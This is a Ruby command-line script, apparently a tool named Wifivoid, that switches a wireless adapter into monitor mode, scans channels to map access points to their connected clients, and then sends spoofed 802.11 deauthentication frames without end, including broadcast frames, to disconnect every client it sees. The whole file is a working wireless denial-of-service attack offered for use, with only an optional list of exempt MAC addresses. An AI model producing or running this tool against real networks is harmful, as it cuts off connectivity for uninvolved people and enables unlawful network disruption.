#!/usr/bin/env ruby

require 'optparse'
require 'thread'
require 'open3'
require_relative 'lib/hash_patch'
require_relative 'lib/sniffer'
require_relative 'lib/dot11_packet'

def banner
  '
  __    __ _  __ _            _     _
 / / /\ \ (_)/ _(_)\   /\___ (_) __| |
 \ \/  \/ / | |_| \ \ / / _ \| |/ _` |
  \  /\  /| |  _| |\ V / (_) | | (_| |
   \/  \/ |_|_| |_| \_/ \___/|_|\__,_|
                                      ' + "v#{version}"
end

def version
  "1.1.0"
end

def rotation_chars
  ['/', '-', '\\', '|']
end

def input_options
  @input_options ||= parse_flags
end

def adapter
  input_options[:adapter]
end

def channels
  input_options[:channels] || (0..11).to_a
end

def observe_time
  (input_options[:observe_time] || 5).to_i
end

def exceptions
  input_options[:exceptions] || []
end

def collect_before?
  input_options[:collect_before]
end

def parse_flags
  options = {}
  OptionParser.new do |opt|
    opt.on('--adapter          Selected adapter (e.g. "wlan0")') { |o| options[:adapter] = o }
    opt.on('--channels         Specific channels to scan (e.g. "1,2") (default 0-11)') { |o| options[:channels] = if o; o.delete(' ').split(','); end; }
    opt.on('--collect-before   Collect targets before start deauthenticating (default false)') { |o| option[:collect_before] = o || false }
    opt.on('--observe_time     Time in seconds for observing each channel in before deauthenticating (default 5)') { |o| options[:observe_time] = o || 5 }
    opt.on('--exceptions       Select exceptional macs for deauthenticating (e.g. "11:22,88:99") (default [])') { |o| options[:exceptions] = if o; o.delete(' ').split(','); end; }
  end.parse!
  return options
rescue
  puts "[!] Use '-h' to see available options\n"
  abort
end

def start_loading_progress
  Thread.new do
    counter = [0]
    loop do
      counter[0] += 1
      print "\r#{rotation_chars[counter[0] % rotation_chars.length]}\r"
      sleep 0.2
    end
  end
end

def get_mac_address
  interface = Socket.getifaddrs.detect{ |ifaddr| ifaddr.name == adapter }
  interface.addr.to_s[12...18].unpack('H*')[0].scan(/.{2}/).join(':')
rescue
  puts "[!] Unable to detect mac address of adapter '#{adapter}'"
  exit
end

def start_mon_mode
  puts "[i] Starting monitor mode on #{adapter}"
  system "ip link set #{adapter} down"
  system "iwconfig #{adapter} mode monitor"
  system "ip link set #{adapter} up"
rescue
  puts "[!] Unable to start monitor mode"
  exit
end

def stop_mon_mode
  system "ip link set #{adapter} down"
  system "iwconfig #{adapter} mode managed"
  system "ip link set #{adapter} up"
end

def change_channel channel_number, start_observer
  stdin, stdout, stderr, wait_thr1 = Open3.popen3("iw dev #{adapter} set channel #{channel_number}")
  retval = stdout.read
  @observer.terminate if @observer
  @current_channel = channel_number
  start_observing if start_observer
rescue
  puts "[!] Unable to switch to channel #{channel_number}"
end

def start_deauthentication
  @dot11 = Dot11Packet.new
  @dot11.config_socket(adapter, @mac_address)
  @dot11.add_noise(exceptions) if exceptions.any?
  loop do
    @channel_map.clone.nested_each do |ap, clients, channel|
      clients.map { |client| send_deauth_packets(channel, ap, client) }
    end
  end
end

def send_deauth_packets channel, ap, client
  @dot11.send_deauth(client, ap, ap)
  @dot11.send_deauth(ap, client, client)
  @dot11.send_deauth('ff:ff:ff:ff:ff:ff', ap, ap)
rescue
end

def start_observing
  sniffer = Sniffer.new
  @observer = Thread.new do
    current_sniff_channel = @current_channel
    loop do
      pkt = sniffer.receive_packet
      if !pkt.is_noise? && pkt.valid_macs?
        @channel_map[@current_channel][pkt.addr1] |= [pkt.addr2]
      end
    end
  end
end

def start_background_observing
  Thread.new do
    loop do
      channels.each {|channel| sleep(1); change_channel(channel, true) }
    end
  end
end

def run
  puts "#{banner}\n\n"
  input_options

  unless Process.uid == 0
    puts '[!] Must run as root'
    exit
  end

  start_loading_progress

  @mac_address = get_mac_address
  start_mon_mode

  @channel_map = Hash.new
  channels.each { |channel| @channel_map[channel] = Hash.new([]) }

  start_observing

  if collect_before?
    puts "[i] Collecting targets"
    channels.each {|channel| sleep(observe_time); change_channel(channel, true) }
  end

  puts "[i] Started background collecting targets"
  start_background_observing
  puts '[i] Started deauthenticating'
  start_deauthentication
end

trap('SIGINT') { puts "\n\r[!] Ctrl-C pressed\r"; stop_mon_mode; exit }

run
